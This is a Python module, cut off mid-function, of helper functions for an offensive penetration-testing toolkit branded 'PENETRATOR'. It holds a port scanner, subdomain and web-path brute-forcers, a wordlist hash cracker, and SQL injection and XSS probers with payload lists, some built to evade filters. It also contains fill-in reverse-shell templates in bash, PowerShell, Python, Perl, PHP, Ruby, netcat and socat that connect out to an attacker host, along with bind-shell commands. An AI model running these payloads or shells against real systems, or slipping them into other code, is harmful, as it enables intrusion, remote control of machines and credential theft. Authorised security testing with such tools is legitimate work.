"""Pure-logic helpers used by GUI tool frames.

These functions don't print or prompt - they take inputs and call the provided
``log(msg, tag)`` callback. That makes them trivial to wire into any UI.
"""
from __future__ import annotations

import base64
import hashlib
import html as html_mod
import itertools
import re
import secrets
import socket
import string
import struct
import time
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path
from typing import Callable
from collections.abc import Iterable

Logger = Callable[..., None]  # log(msg, tag=...)

# Module-level cancellation hook (set by TaskRunner before each run).
# Engine functions can call _should_stop() inside long loops.
_stop_check: Callable[[], bool] | None = None


def set_stop_check(fn: Callable[[], bool] | None) -> None:
    """Install a callable that returns True when the user requested stop."""
    global _stop_check
    _stop_check = fn


def _should_stop() -> bool:
    return _stop_check() if _stop_check is not None else False


# Cross-tool memory: last scan / discovery results, accessible to "chain" tools.
_session: dict[str, object] = {
    "last_target": None,
    "last_open_ports": [],
    "last_subdomains": [],
    "last_buster_paths": [],
}


def session_get(key: str, default=None):
    return _session.get(key, default)


def session_set(key: str, value) -> None:
    _session[key] = value


def session_dump() -> dict:
    """Snapshot the cross-tool memory (used by the workspace save feature)."""
    import copy
    return copy.deepcopy(_session)


def session_restore(snapshot: dict) -> None:
    if isinstance(snapshot, dict):
        _session.update(snapshot)

# ---------------------------------------------------------------------------
# Constants (shared with CLI modules)
# ---------------------------------------------------------------------------
COMMON_SERVICES = {
    21: "ftp", 22: "ssh", 23: "telnet", 25: "smtp", 53: "dns",
    80: "http", 110: "pop3", 135: "msrpc", 139: "netbios", 143: "imap",
    443: "https", 445: "smb", 465: "smtps", 587: "submission", 993: "imaps",
    995: "pop3s", 1433: "mssql", 1521: "oracle", 3306: "mysql", 3389: "rdp",
    5432: "postgresql", 5900: "vnc", 6379: "redis", 8080: "http-alt",
    8443: "https-alt", 27017: "mongodb",
}

COMMON_SUBDOMAINS = [
    "www", "mail", "ftp", "webmail", "smtp", "pop", "ns1", "ns2", "webdisk",
    "admin", "forum", "blog", "login", "api", "dev", "test", "stage", "m",
    "mobile", "shop", "store", "status", "static", "cdn", "assets", "img",
    "images", "download", "downloads", "docs", "help", "support", "portal",
    "vpn", "remote", "cpanel", "secure", "server", "git", "gitlab", "jenkins",
    "grafana", "kibana", "beta", "demo", "staging", "app", "apps", "intranet",
    "news", "media", "video", "chat", "monitor", "jira", "wiki", "sso",
]

DEFAULT_WEB_PATHS = [
    "admin", "administrator", "login", "wp-admin", "wp-login.php",
    "wp-content", "wp-includes", "config.php", "config.bak", "config.old",
    "backup", "backup.zip", "backup.tar.gz", ".git", ".git/config", ".env",
    ".htaccess", ".htpasswd", "robots.txt", "sitemap.xml", "phpinfo.php",
    "phpmyadmin", "server-status", "test.php", "info.php", "setup.php",
    "install.php", "shell.php", "upload", "uploads", "images", "assets",
    "api", "api/v1", "api/v2", "users", "user", "profile", "dashboard",
    "console", "manage", "panel", "cpanel", "webmail", "mail",
    "backup.sql", "database.sql", "db.sql", "dump.sql",
    "README.md", "LICENSE", "package.json", "composer.json",
    "debug", "phpmyadmin/index.php", "adminer.php",
]

SECURITY_HEADERS = {
    "Strict-Transport-Security": "Enforces HTTPS",
    "Content-Security-Policy": "Restricts resource origins",
    "X-Frame-Options": "Anti-clickjacking",
    "X-Content-Type-Options": "MIME sniffing protection",
    "Referrer-Policy": "Controls Referer header",
    "Permissions-Policy": "Browser feature permissions",
    "X-XSS-Protection": "Legacy XSS filter",
}

HASH_SIGNATURES: list[tuple[str, re.Pattern[str]]] = [
    ("MD5",            re.compile(r"^[a-f0-9]{32}$", re.I)),
    ("SHA-1",          re.compile(r"^[a-f0-9]{40}$", re.I)),
    ("SHA-224",        re.compile(r"^[a-f0-9]{56}$", re.I)),
    ("SHA-256",        re.compile(r"^[a-f0-9]{64}$", re.I)),
    ("SHA-384",        re.compile(r"^[a-f0-9]{96}$", re.I)),
    ("SHA-512",        re.compile(r"^[a-f0-9]{128}$", re.I)),
    ("NTLM",           re.compile(r"^[a-f0-9]{32}$", re.I)),
    ("bcrypt",         re.compile(r"^\$2[abxy]\$\d+\$.{53}$")),
    ("Argon2",         re.compile(r"^\$argon2(id|i|d)\$")),
    ("SHA-512 crypt",  re.compile(r"^\$6\$")),
    ("SHA-256 crypt",  re.compile(r"^\$5\$")),
    ("MD5 crypt",      re.compile(r"^\$1\$")),
    ("MySQL 4.1+",     re.compile(r"^\*[A-F0-9]{40}$")),
]

SUPPORTED_HASH_ALGOS = ("md5", "sha1", "sha224", "sha256", "sha384", "sha512")

SQL_PAYLOADS = [
    "'", "\"", "' OR '1'='1", "' OR '1'='1' -- ", "' OR 1=1-- -",
    "\" OR \"1\"=\"1", "') OR ('1'='1", "' UNION SELECT NULL-- ",
    "admin' -- ",
]
SQL_ERROR_SIGNATURES = [
    "you have an error in your sql syntax", "warning: mysql",
    "unclosed quotation mark", "quoted string not properly terminated",
    "pg_query()", "pg::syntaxerror", "sqlite3::", "ora-00933", "ora-00921",
    "microsoft odbc", "microsoft sql server", "sqlstate", "odbc driver",
]

XSS_PAYLOADS_BASIC = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "<body onload=alert(1)>",
    "<iframe src=\"javascript:alert(1)\">",
    "\"><script>alert(1)</script>",
    "'><script>alert(1)</script>",
    "<details open ontoggle=alert(1)>",
    "<input autofocus onfocus=alert(1)>",
]
XSS_PAYLOADS_POLYGLOT = [
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
    "\"><img src=x onerror=alert(1)>",
    "</script><svg/onload=alert(1)>",
]
XSS_PAYLOADS_WAF = [
    "<scr<script>ipt>alert(1)</scr</script>ipt>",
    "<ScRipT>alert(1)</sCrIpT>",
    "<img src=x oneonerrorrror=alert(1)>",
    "<math><brute href=javascript:alert(1)>X</brute>",
    "%3Cscript%3Ealert(1)%3C/script%3E",
]

REVERSE_SHELL_TEMPLATES = {
    "Bash":          'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1',
    "PowerShell":    '$c=New-Object System.Net.Sockets.TCPClient("{lhost}",{lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$out=(Invoke-Expression $d 2>&1|Out-String);$sb=([text.encoding]::ASCII).GetBytes($out);$s.Write($sb,0,$sb.Length);$s.Flush()}};$c.Close()',
    "Python (nix)":  'import socket,subprocess,os;s=socket.socket();s.connect(("{lhost}",{lport}));[os.dup2(s.fileno(),f) for f in(0,1,2)];subprocess.call(["/bin/sh","-i"])',
    "Python (win)":  'import socket,subprocess,os;s=socket.socket();s.connect(("{lhost}",{lport}));[os.dup2(s.fileno(),f) for f in(0,1,2)];subprocess.call(["cmd.exe"])',
    "Perl":          'perl -e \'use Socket;$i="{lhost}";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};\'',
    "PHP":           'php -r \'$sock=fsockopen("{lhost}",{lport});exec("/bin/sh -i <&3 >&3 2>&3");\'',
    "Ruby":          'ruby -rsocket -e\'f=TCPSocket.open("{lhost}",{lport}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'',
    "Netcat (mkfifo)": 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f',
    "Socat":         'socat tcp-connect:{lhost}:{lport} exec:bash,pty,stderr,setsid,sigint,sane',
}

BIND_SHELL_TEMPLATES = {
    "nc (Linux)":   'nc -lvp {lport} -e /bin/bash',
    "nc (Windows)": 'nc -lvp {lport} -e cmd.exe',
    "ncat":         'ncat -lvp {lport} -e /bin/bash',
    "Python":       'python -c \'import socket,subprocess,os;s=socket.socket();s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);s.bind(("0.0.0.0",{lport}));s.listen(1);c,a=s.accept();[os.dup2(c.fileno(),f) for f in (0,1,2)];subprocess.call(["/bin/sh","-i"])\'',
    "Perl":         'perl -e \'use Socket;$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));setsockopt(S,SOL_SOCKET,SO_REUSEADDR,1);bind(S,sockaddr_in($p,INADDR_ANY));listen(S,5);while(1){{accept(C,S);open(STDIN,">&C");open(STDOUT,">&C");open(STDERR,">&C");exec("/bin/sh -i");}}\'',
}

MAGIC_SIGNATURES: list[tuple[bytes, str]] = [
    (b"\x89PNG\r\n\x1a\n",        "PNG image"),
    (b"\xFF\xD8\xFF",              "JPEG image"),
    (b"GIF87a",                    "GIF image (87a)"),
    (b"GIF89a",                    "GIF image (89a)"),
    (b"BM",                        "BMP image"),
    (b"%PDF",                      "PDF document"),
    (b"PK\x03\x04",                "ZIP / OOXML / JAR"),
    (b"Rar!\x1a\x07\x00",          "RAR v1.5+"),
    (b"Rar!\x1a\x07\x01\x00",      "RAR v5+"),
    (b"\x1f\x8b\x08",              "GZIP"),
    (b"7z\xBC\xAF\x27\x1C",        "7-Zip"),
    (b"MZ",                        "Windows PE executable"),
    (b"\x7FELF",                   "Linux ELF executable"),
    (b"\xCA\xFE\xBA\xBE",          "Java class / Mach-O FAT"),
    (b"\xFE\xED\xFA\xCE",          "Mach-O (32-bit)"),
    (b"\xFE\xED\xFA\xCF",          "Mach-O (64-bit)"),
    (b"SQLite format 3\x00",       "SQLite database"),
    (b"ID3",                       "MP3 (ID3)"),
    (b"OggS",                      "OGG"),
    (b"RIFF",                      "RIFF (WAV/AVI)"),
    (b"fLaC",                      "FLAC audio"),
]

USERNAME_SITES: dict[str, str] = {
    "GitHub":     "https://github.com/{u}",
    "GitLab":     "https://gitlab.com/{u}",
    "Twitter/X":  "https://x.com/{u}",
    "Instagram":  "https://www.instagram.com/{u}/",
    "Reddit":     "https://www.reddit.com/user/{u}",
    "Medium":     "https://medium.com/@{u}",
    "DevTo":      "https://dev.to/{u}",
    "Hashnode":   "https://hashnode.com/@{u}",
    "HackerNews": "https://news.ycombinator.com/user?id={u}",
    "HackerOne":  "https://hackerone.com/{u}",
    "Bugcrowd":   "https://bugcrowd.com/{u}",
    "Twitch":     "https://www.twitch.tv/{u}",
    "YouTube":    "https://www.youtube.com/@{u}",
    "TikTok":     "https://www.tiktok.com/@{u}",
    "Keybase":    "https://keybase.io/{u}",
    "Steam":      "https://steamcommunity.com/id/{u}",
    "StackOverflow": "https://stackoverflow.com/users/{u}",
    "SoundCloud": "https://soundcloud.com/{u}",
    "Vimeo":      "https://vimeo.com/{u}",
    "Pinterest":  "https://www.pinterest.com/{u}/",
}

LEET_MAP = {
    "a": ["a", "A", "4", "@"], "b": ["b", "B", "8"], "e": ["e", "E", "3"],
    "g": ["g", "G", "9"], "i": ["i", "I", "1", "!"], "l": ["l", "L", "1"],
    "o": ["o", "O", "0"], "s": ["s", "S", "5", "$"], "t": ["t", "T", "7"],
    "z": ["z", "Z", "2"],
}

EMAIL_REGEX = re.compile(r"^[A-Za-z0-9._%+-]+@([A-Za-z0-9.-]+\.[A-Za-z]{2,})$")
DELIMITER = "<<<PEN_END>>>"


# ---------------------------------------------------------------------------
# Information Gathering
# ---------------------------------------------------------------------------
def get_service(port: int) -> str:
    try:
        return socket.getservbyport(port, "tcp")
    except OSError:
        return COMMON_SERVICES.get(port, "unknown")


def _check_port(target: str, port: int, timeout: float) -> bool:
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.settimeout(timeout)
            return sock.connect_ex((target, port)) == 0
    except OSError:
        return False


def scan_ports(target: str, start: int, end: int, threads: int, timeout: float,
               log: Logger) -> list[int]:
    try:
        ip = socket.gethostbyname(target)
    except socket.gaierror as exc:
        log(f"[-] Cannot resolve {target}: {exc}", "err")
        return []
    log(f"[*] Scanning {target} ({ip})  ports {start}-{end}  threads={threads}", "cyan")
    ports = list(range(start, end + 1))
    open_ports: list[int] = []
    t0 = time.time()
    with ThreadPoolExecutor(max_workers=threads) as pool:
        futures = {pool.submit(_check_port, ip, p, timeout): p for p in ports}
        for fut in as_completed(futures):
            if _should_stop():
                log("[!] Stop requested - cancelling scan", "warn")
                for f in futures:
                    f.cancel()
                break
            port = futures[fut]
            if fut.result():
                service = get_service(port)
                open_ports.append(port)
                log(f"[+] {port:>5}/tcp   {service}", "ok")
    log(f"[*] Found {len(open_ports)} open port(s) in {time.time()-t0:.2f}s", "cyan")
    sorted_ports = sorted(open_ports)
    session_set("last_target", target)
    session_set("last_open_ports", sorted_ports)
    return sorted_ports


def resolve_host(host: str, log: Logger) -> list[str]:
    try:
        _, _, ips = socket.gethostbyname_ex(host)
    except socket.gaierror as exc:
        log(f"[-] {exc}", "err")
        return []
    for ip in ips:
        log(f"[+] {host} -> {ip}", "ok")
    return ips


def whois_lookup(domain: str, log: Logger) -> dict:
    try:
        import whois  # type: ignore
    except ImportError:
        log("[-] python-whois not installed. Run: pip install python-whois", "err")
        return {}
    try:
        data = whois.whois(domain)
    except Exception as exc:
        log(f"[-] {exc}", "err")
        return {}
    out: dict[str, str] = {}
    for key, value in data.items():
        if value is None or value == []:
            continue
        if isinstance(value, list):
            value = ", ".join(str(v) for v in value)
        out[str(key)] = str(value)
        log(f"  {key:<22} {value}", "info")
    return out


def dns_lookup(domain: str, log: Logger) -> dict[str, list[str]]:
    try:
        import dns.resolver  # type: ignore
    except ImportError:
        log("[-] dnspython not installed. Run: pip install dnspython", "err")
        return {}
    out: dict[str, list[str]] = {}
    for rtype in ("A", "AAAA", "MX", "NS", "TXT", "CNAME", "SOA"):
        try:
            answers = dns.resolver.resolve(domain, rtype, lifetime=5)
            values = [str(rdata) for rdata in answers]
        except Exception:
            continue
        out[rtype] = values
        for value in values:
            log(f"  {rtype:<6} {value}", "info")
    if not out:
        log("[!] No DNS records found", "warn")
    return out


def find_subdomains(domain: str, threads: int, log: Logger) -> list[tuple[str, str]]:
    def check(sub: str) -> tuple[str, str] | None:
        try:
            ip = socket.gethostbyname(f"{sub}.{domain}")
            return sub, ip
        except socket.gaierror:
            return None

    log(f"[*] Brute-forcing {len(COMMON_SUBDOMAINS)} subdomains of {domain}", "cyan")
    found: list[tuple[str, str]] = []
    with ThreadPoolExecutor(max_workers=threads) as pool:
        for result in (f.result() for f in as_completed(pool.submit(check, s) for s in COMMON_SUBDOMAINS)):
            if result:
                found.append(result)
                log(f"[+] {result[0]}.{domain} -> {result[1]}", "ok")
    if not found:
        log("[!] No subdomains found", "warn")
    return sorted(found)


def fetch_headers(url: str, log: Logger) -> dict:
    import requests
    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    try:
        resp = requests.get(url, timeout=10, allow_redirects=True,
                            headers={"User-Agent": "PENETRATOR/1.0"})
    except requests.RequestException as exc:
        log(f"[-] {exc}", "err")
        return {}
    log(f"[+] {url}  -> {resp.status_code}  final: {resp.url}", "ok")
    headers = dict(resp.headers)
    for k, v in headers.items():
        log(f"  {k}: {v}", "info")
    return headers


# ---------------------------------------------------------------------------
# Password tools
# ---------------------------------------------------------------------------
def identify_hash(value: str) -> list[str]:
    value = value.strip()
    matches = [name for name, pat in HASH_SIGNATURES if pat.match(value)]
    if "MD5" in matches and "NTLM" in matches:
        return ["MD5 / NTLM / LM hash  (32-char hex, context-dependent)"]
    return matches


def crack_hash(value: str, algo: str, wordlist_path: str,
               log: Logger) -> str | None:
    value = value.strip().lower()
    algo = algo.lower()
    if algo not in SUPPORTED_HASH_ALGOS:
        log(f"[-] Unsupported algorithm: {algo}", "err")
        return None
    path = Path(wordlist_path)
    if not path.is_file():
        log(f"[-] Wordlist not found: {wordlist_path}", "err")
        return None
    log(f"[*] Cracking {algo.upper()} using {path}", "cyan")
    tried = 0
    t0 = time.time()
    with path.open("r", encoding="utf-8", errors="ignore") as fh:
        for line in fh:
            if _should_stop():
                log("[!] Stop requested - aborting crack", "warn")
                return None
            word = line.rstrip("\r\n")
            if not word:
                continue
            tried += 1
            digest = hashlib.new(algo, word.encode("utf-8", errors="ignore")).hexdigest()
            if digest == value:
                log(f"[+] Match found after {tried} attempts: {word}", "ok")
                return word
            if tried % 20000 == 0:
                log(f"    ... tried {tried:,} words", "muted")
    log(f"[-] Not found (tried {tried:,} in {time.time()-t0:.2f}s)", "warn")
    return None


def password_strength(pw: str) -> tuple[int, str]:
    score = 0
    if len(pw) >= 8: score += 1
    if len(pw) >= 12: score += 1
    if re.search(r"[a-z]", pw) and re.search(r"[A-Z]", pw): score += 1
    if re.search(r"\d", pw) and re.search(r"[^A-Za-z0-9]", pw): score += 1
    label = {0: "Very weak", 1: "Weak", 2: "Fair", 3: "Strong", 4: "Very strong"}[score]
    return score, label


def generate_password(length: int, upper: bool, digits: bool, symbols: bool) -> str:
    alphabet = string.ascii_lowercase
    if upper:   alphabet += string.ascii_uppercase
    if digits:  alphabet += string.digits
    if symbols: alphabet += "!@#$%^&*()-_=+[]{};:,.?/"
    return "".join(secrets.choice(alphabet) for _ in range(length))


# ---------------------------------------------------------------------------
# Web attacks
# ---------------------------------------------------------------------------
def buster(url: str, paths: list[str], threads: int, log: Logger) -> list[tuple[int, str]]:
    import requests
    from urllib.parse import urljoin
    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    url = url.rstrip("/") + "/"

    sess = requests.Session()
    sess.headers.update({"User-Agent": "PENETRATOR/1.0"})
    found: list[tuple[int, str]] = []

    def check(p: str) -> tuple[int, str] | None:
        target = urljoin(url, p)
        try:
            resp = sess.head(target, timeout=5, allow_redirects=False)
            if resp.status_code == 405:
                resp = sess.get(target, timeout=5, allow_redirects=False)
        except requests.RequestException:
            return None
        if resp.status_code in (200, 201, 202, 204, 301, 302, 307, 401, 403):
            return resp.status_code, target
        return None

    log(f"[*] Busting {url} with {len(paths)} paths  threads={threads}", "cyan")
    with ThreadPoolExecutor(max_workers=threads) as pool:
        for result in (f.result() for f in as_completed(pool.submit(check, p) for p in paths)):
            if result:
                found.append(result)
                log(f"[+] {result[0]}  {result[1]}", "ok")
    log(f"[*] Discovered {len(found)} endpoint(s)", "cyan")
    return sorted(found)


def check_security_headers(url: str, log: Logger) -> dict:
    import requests
    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    try:
        resp = requests.get(url, timeout=10, allow_redirects=True,
                            headers={"User-Agent": "PENETRATOR/1.0"})
    except requests.RequestException as exc:
        log(f"[-] {exc}", "err")
        return {}
    result = {}
    for header, purpose in SECURITY_HEADERS.items():
        value = resp.headers.get(header)
        result[header] = value
        if value:
            log(f"[+] {header}: {value}", "ok")
        else:
            log(f"[-] missing: {header}  ({purpose})", "warn")
    return result


def fetch_discovery_files(url: str, log: Logger) -> dict:
    import requests
    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    url = url.rstrip("/")
    out: dict[str, tuple[int, str]] = {}
    for path in ("robots.txt", "sitemap.xml", "security.txt", ".well-known/security.txt"):
        target = f"{url}/{path}"
        try:
            resp = requests.get(target, timeout=8,
                                headers={"User-Agent": "PENETRATOR/1.0"})
        except requests.RequestException:
            continue
        out[path] = (resp.status_code, resp.text)
        tag = "ok" if resp.status_code == 200 and resp.text.strip() else "muted"
        log(f"[{resp.status_code}] {target}", tag)
        if resp.status_code == 200 and resp.text.strip():
            preview = "\n".join(resp.text.splitlines()[:40])
            log(preview, "muted")
    return out


def detect_tech(url: str, log: Logger) -> dict:
    import requests
    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    try:
        resp = requests.get(url, timeout=10, allow_redirects=True,
                            headers={"User-Agent": "PENETRATOR/1.0"})
    except requests.RequestException as exc:
        log(f"[-] {exc}", "err")
        return {}
    findings: dict[str, str] = {}
    for header in ("Server", "X-Powered-By", "Via"):
        if header in resp.headers:
            findings[header] = resp.headers[header]
    sigs = {
        "WordPress": [r"/wp-content/", r"/wp-includes/"],
        "Drupal": [r"Drupal.settings", r"/sites/default/"],
        "Joomla": [r"/media/jui/", r"Joomla!"],
        "Laravel": [r"laravel_session"],
        "Django": [r"csrftoken"],
        "Magento": [r"/static/version", r"Mage\."],
        "Shopify": [r"cdn\.shopify\.com"],
        "React": [r"__REACT_DEVTOOLS"],
        "Vue.js": [r"__VUE"],
        "Angular": [r"ng-version"],
        "jQuery": [r"jquery(?:\.min)?\.js"],
        "Bootstrap": [r"bootstrap(?:\.min)?\.css"],
        "Cloudflare": [r"cloudflare", r"cf-ray"],
    }
    body = resp.text[:200000]
    headers_blob = "\n".join(f"{k}:{v}" for k, v in resp.headers.items())
    for tech, patterns in sigs.items():
        for pattern in patterns:
            if re.search(pattern, body, re.I) or re.search(pattern, headers_blob, re.I):
                findings[tech] = "detected"
                break
    for k, v in findings.items():
        log(f"[+] {k}: {v}", "ok")
    if not findings:
        log("[!] No technology fingerprint detected", "warn")
    return findings


# ---------------------------------------------------------------------------
# SQL injection detection (light)
# ---------------------------------------------------------------------------
def sqli_detect(url: str, log: Logger) -> list[tuple[str, str, str]]:
    import requests
    from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse
    parsed = urlparse(url)
    params = dict(parse_qsl(parsed.query))
    if not params:
        log("[-] URL has no query parameters to test.", "err")
        return []
    sess = requests.Session()
    sess.headers.update({"User-Agent": "PENETRATOR/1.0"})
    findings: list[tuple[str, str, str]] = []
    for param in params:
        log(f"[*] Testing parameter: {param}", "cyan")
        for payload in SQL_PAYLOADS:
            mutated = dict(params); mutated[param] = params[param] + payload
            test_url = urlunparse(parsed._replace(query=urlencode(mutated)))
            try:
                resp = sess.get(test_url, timeout=10, allow_redirects=False)
            except requests.RequestException:
                continue
            body = resp.text.lower()
            for sig in SQL_ERROR_SIGNATURES:
                if sig in body:
                    findings.append((param, payload, sig))
                    log(f"[+] {param}  payload={payload}  indicator={sig}", "ok")
                    break
    if not findings:
        log("[!] No obvious SQL injection indicator found", "warn")
    return findings


# ---------------------------------------------------------------------------
# XSS encoding + reflected scanner
# ---------------------------------------------------------------------------
def xss_encodings(payload: str) -> dict[str, str]:
    data = payload.encode()
    return {
        "URL": urllib.parse.quote(payload, safe=""),
        "URL (full)": urllib.parse.quote_plus(payload),
        "HTML entity": html_mod.escape(payload, quote=True),
        "HTML numeric": "".join(f"&#{ord(c)};" for c in payload),
        "Hex (\\x)": "".join(f"\\x{ord(c):02x}" for c in payload),
        "Unicode (\\u)": "".join(f"\\u{ord(c):04x}" for c in payload),
        "Base64": base64.b64encode(data).decode(),
    }


def xss_reflected(url: str, log: Logger) -> list[tuple[str, str]]:
    import requests
    from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse
    parsed = urlparse(url)
    params = dict(parse_qsl(parsed.query))
    if not params:
        log("[-] URL has no query parameters to test.", "err")
        return []
    sess = requests.Session()
    sess.headers.update({"User-Agent": "PENETRATOR/1.0"})
    findings: list[tuple[str, str]] = []
    marker = "penetx1337"
    for param in params:
        log(f"[*] Testing parameter: {param}", "cyan")
        for payload in XSS_PAYLOADS_BASIC:
            marked = payload.replace("alert(1)", f"alert('{marker}')")
            mutated = dict(params); mutated[param] = marked
            test_url = urlunparse(parsed._replace(query=urlencode(mutated, safe="<>\"'/=()")))
            try:
                resp = sess.get(test_url, timeout=8, allow_redirects=False)
            except requests.RequestException:
                continue
            if marked in resp.text:
                findings.append((param, marked))
                log(f"[+] Reflected: {marked}", "ok")
    if not findings:
        log("[!] No reflected payloads detected", "warn")
    return findings


# ---------------------------------------------------------------------------
# Payload encoders
# ---------------------------------------------------------------------------
def encode_payload(text: str) -> dict[str, str]:
    data = text.encode()
    return {
        "Base64": base64.b64encode(data).decode(),
        "Base64 (url-safe)": base64.urlsafe_b64encode(data).decode(),
        "Hex": data.hex(),
        "Hex (spaced)": " ".join(f"{b:02x}" for b in data),
        "PowerShell UTF16LE B64": base64.b64encode(text.encode("utf-16le")).decode(),
        "URL-encoded": urllib.parse.quote(text, safe=""),
    }


# ---------------------------------------------------------------------------
# Steganography (LSB + whitespace)
# ---------------------------------------------------------------------------
def _text_to_bits(text: str) -> str:
    return "".join(f"{byte:08b}" for byte in text.encode("utf-8"))


def _bits_to_text(bits: str) -> str:
    out = bytearray()
    for i in range(0, len(bits) - 7, 8):
        out.append(int(bits[i:i + 8], 2))
    return out.decode("utf-8", errors="ignore")


def image_hide(cover: str, message: str, output: str, log: Logger) -> str | None:
    try:
        from PIL import Image
    except ImportError:
        log("[-] Pillow not installed. Run: pip install Pillow", "err")
        return None
    src = Path(cover)
    if not src.is_file():
        log(f"[-] Cover not found: {cover}", "err")
        return None
    image = Image.open(src).convert("RGB")
    # Use .load() pixel access (modern API; avoids getdata() deprecation in Pillow 14)
    px = image.load()
    w, h = image.size
    bits = _text_to_bits(message + DELIMITER)
    if len(bits) > w * h * 3:
        log("[-] Cover image too small for the message", "err")
        return None
    bi = 0
    for y in range(h):
        for x in range(w):
            if bi >= len(bits):
                break
            r, g, b = px[x, y]
            if bi < len(bits):
                r = (r & ~1) | int(bits[bi]); bi += 1
            if bi < len(bits):
                g = (g & ~1) | int(bits[bi]); bi += 1
            if bi < len(bits):
                b = (b & ~1) | int(bits[bi]); bi += 1
            px[x, y] = (r, g, b)
        if bi >= len(bits):
            break
    out = Path(output)
    image.save(out, format="PNG")
    log(f"[+] Saved {out}", "ok")
    return str(out)


def image_extract(stego: str, log: Logger) -> str | None:
    try:
        from PIL import Image
    except ImportError:
        log("[-] Pillow not installed. Run: pip install Pillow", "err")
        return None
    src = Path(stego)
    if not src.is_file():
        log(f"[-] File not found: {stego}", "err")
        return None
    image = Image.open(src).convert("RGB")
    px = image.load()
    w, h = image.size
    bits: list[str] = []
    for y in range(h):
        for x in range(w):
            r, g, b = px[x, y]
            bits.append(str(r & 1))
            bits.append(str(g & 1))
            bits.append(str(b & 1))
    text = _bits_to_text("".join(bits))
    if DELIMITER in text:
        msg = text.split(DELIMITER, 1)[0]
        log(f"[+] Extracted: {msg}", "ok")
        return msg
    log("[-] No embedded message found", "warn")
    return None


def ws_hide(cover: str, message: str, output: str, log: Logger) -> str | None:
    src = Path(cover)
    if not src.is_file():
        log(f"[-] Cover not found: {cover}", "err")
        return None
    bits = _text_to_bits(message + DELIMITER)
    lines = src.read_text(encoding="utf-8", errors="ignore").splitlines()
    if len(bits) > len(lines):
        lines.extend(["."] * (len(bits) - len(lines)))
    stamped = []
    for idx, line in enumerate(lines):
        stripped = line.rstrip()
        if idx < len(bits):
            stripped += "\t" if bits[idx] == "1" else " "
        stamped.append(stripped)
    out = Path(output)
    out.write_text("\n".join(stamped) + "\n", encoding="utf-8")
    log(f"[+] Saved {out}", "ok")
    return str(out)


def ws_extract(stego: str, log: Logger) -> str | None:
    src = Path(stego)
    if not src.is_file():
        log(f"[-] File not found: {stego}", "err")
        return None
    bits: list[str] = []
    for line in src.read_text(encoding="utf-8", errors="ignore").splitlines():
        if line.endswith("\t"): bits.append("1")
        elif line.endswith(" "): bits.append("0")
    text = _bits_to_text("".join(bits))
    if DELIMITER in text:
        msg = text.split(DELIMITER, 1)[0]
        log(f"[+] Extracted: {msg}", "ok")
        return msg
    log("[-] No embedded message found", "warn")
    return None


# ---------------------------------------------------------------------------
# Reverse engineering + forensic
# ---------------------------------------------------------------------------
def extract_strings(path: str, min_len: int, log: Logger) -> list[tuple[int, str]]:
    p = Path(path)
    if not p.is_file():
        log(f"[-] File not found: {path}", "err")
        return []
    data = p.read_bytes()
    results: list[tuple[int, str]] = []
    current = bytearray(); start = 0
    for i, byte in enumerate(data):
        if 32 <= byte < 127:
            if not current: start = i
            current.append(byte)
        else:
            if len(current) >= min_len:
                results.append((start, current.decode("ascii", errors="ignore")))
            current = bytearray()
    if len(current) >= min_len:
        results.append((start, current.decode("ascii", errors="ignore")))
    log(f"[*] {len(results)} ASCII strings >= {min_len} chars", "cyan")
    return results


def parse_pe(path: str, log: Logger) -> dict:
    p = Path(path)
    if not p.is_file():
        log(f"[-] File not found: {path}", "err")
        return {}
    data = p.read_bytes()
    if len(data) < 0x40 or data[:2] != b"MZ":
        log("[-] Not a PE file (missing MZ header)", "err")
        return {}
    pe_offset = struct.unpack_from("<I", data, 0x3C)[0]
    if data[pe_offset:pe_offset + 4] != b"PE\0\0":
        log("[-] Invalid PE signature", "err")
        return {}
    machine, num_sections, timestamp, _, _, opt_hdr_size, characteristics = \
        struct.unpack_from("<HHIIIHH", data, pe_offset + 4)
    machines = {0x14c: "x86", 0x8664: "x64", 0x1c0: "ARM", 0xaa64: "ARM64"}
    out: dict = {
        "size": len(data),
        "machine": machines.get(machine, f"0x{machine:x}"),
        "sections": num_sections,
        "timestamp": timestamp,
        "characteristics": f"0x{characteristics:x}",
        "sec_table": [],
    }
    log(f"[+] Machine: {out['machine']}  sections: {num_sections}", "ok")
    sec_offset = pe_offset + 24 + opt_hdr_size
    for i in range(num_sections):
        off = sec_offset + i * 40
        if off + 40 > len(data): break
        name = data[off:off + 8].rstrip(b"\x00").decode("ascii", errors="replace")
        vsize, vaddr, rsize, rptr = struct.unpack_from("<IIII", data, off + 8)
        out["sec_table"].append((name, vsize, vaddr, rsize, rptr))
        log(f"  {name:<10} vsize=0x{vsize:x} vaddr=0x{vaddr:x} raw=0x{rsize:x}@0x{rptr:x}", "info")
    return out


def hex_dump(path: str, offset: int, length: int, log: Logger) -> str:
    p = Path(path)
    if not p.is_file():
        log(f"[-] File not found: {path}", "err")
        return ""
    with p.open("rb") as fh:
        fh.seek(offset)
        chunk = fh.read(length)
    lines = []
    for i in range(0, len(chunk), 16):
        row = chunk[i:i + 16]
